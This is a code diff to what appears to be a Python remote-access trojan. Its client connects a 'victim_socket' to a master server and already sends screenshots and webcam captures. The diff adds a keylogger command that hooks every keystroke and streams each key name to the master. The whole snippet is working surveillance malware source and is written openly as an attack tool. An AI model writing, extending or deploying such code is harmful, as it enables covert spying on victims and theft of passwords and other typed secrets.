@@ -2,6 +2,8 @@ import socket
 from  PIL import ImageGrab
 import os
 import cv2
+from pynput import keyboard
+import keyboard
 
 #consts
 MASTER_HOST = '127.0.0.1'
@@ -40,6 +42,9 @@ def get_webcam():
     vc.release()
     cv2.destroyWindow("press ESC to exit")
 
+def key_press_event(event,socket):
+    socket.send(event.name.encode(HASH))
+
 def main():
     #open a socket to connect the master (the server)
     with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as victim_socket:
@@ -72,6 +77,12 @@ def main():
         elif remote_command == "webcam":
             get_webcam()
             take_screenshot("webcam.png",victim_socket)
+        #send to the master's console every key that is pressed
+        elif remote_command == "keylis":
+            # register the callback for all key events
+            keyboard.hook(callback=lambda event: key_press_event(event,victim_socket))
+            # keep the program running
+            keyboard.wait('esc')
             
 if __name__ == '__main__':
     main()
